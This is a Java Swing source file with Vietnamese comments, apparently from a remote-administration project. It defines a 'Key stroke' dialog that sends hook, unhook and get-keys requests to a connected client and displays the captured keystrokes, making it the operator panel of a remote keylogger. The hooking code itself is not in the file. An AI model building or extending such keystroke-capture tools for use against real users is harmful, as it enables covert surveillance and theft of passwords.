package server.socket;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.JButton;
import javax.swing.JDialog;
import javax.swing.JFrame;
import javax.swing.JTextArea;

public class KeyStroke{
	MainFrame parent;
	final String title = "Key stroke";

	JTextArea keys;
	SendReceive srvc;
	JDialog ks;
	
	public KeyStroke(MainFrame owner) {
		if (owner == null){
			JFrame emptyWin = new JFrame();
			ks = new JDialog(emptyWin, title, true);
		}
		else{
			ks = new JDialog(owner,title, true);
			parent=owner;
		}
		
		ks.addWindowListener( 
	              new java.awt.event.WindowAdapter() {
	                public void windowClosing( java.awt.event.WindowEvent e ) {
	                	srvc.sendUnhook(parent.client);
	                  ks.setVisible(false);
	                }
	                }
	            );
		
		//Tạo giao diện
		ks.setLayout(null);
		JButton hookButton = new JButton("Hook");
		hookButton.setBounds(30, 20, 80, 30);
		JButton unhookButton = new JButton("Unhook");
		unhookButton.setBounds(120, 20, 80, 30);
		JButton printButton = new JButton("Print");
		printButton.setBounds(210, 20, 80, 30);
		JButton clearButton = new JButton("Clear");
		clearButton.setBounds(300, 20, 80, 30);
		keys = new JTextArea(10,300);
		keys.setBounds(30, 70, 350, 220);
		keys.setEnabled(false);
		keys.setLineWrap(true);
		
	    ks.add(hookButton);
	    ks.add(unhookButton);
	    ks.add(printButton);
	    ks.add(clearButton);
	    ks.add(keys);
	    ks.pack();
		ks.setSize(430, 350);
		ks.setLocation(150, 100);
		
		srvc = new SendReceive();
		
		//Gửi gói tin yêu cầu hook
		hookButton.addActionListener(
				new ActionListener(){
					public void actionPerformed(ActionEvent evt){
						srvc.sendHook(parent.client);
					}
				});
		
		//Gửi gói tin yêu cầu unhook
		unhookButton.addActionListener(
				new ActionListener(){
					public void actionPerformed(ActionEvent evt){
						srvc.sendUnhook(parent.client);
					}
				});
		
		//Gửi gói tin yêu cầu lấy keys về
		printButton.addActionListener(
				new ActionListener(){
					public void actionPerformed(ActionEvent evt){
						srvc.sendGetKeys(parent.client);
					}
				});
		
		//Xóa màn hình hiển thị
		clearButton.addActionListener(
				new ActionListener(){
					public void actionPerformed(ActionEvent evt){
						keys.setText("");
						ks.add(keys);
					}
				});
	}
	
	public void show(){
		ks.setVisible(true);
	}
	//Thêm chuỗi vào màn hình hiển thị
	public void setKeys(String s){
		if (!s.equals("")){
			if(!keys.getText().equals(""))
				keys.setText(keys.getText()+"\n"+s);
			else
				keys.setText(s);
			System.out.println(s);
			ks.add(keys);
		}
	}
}
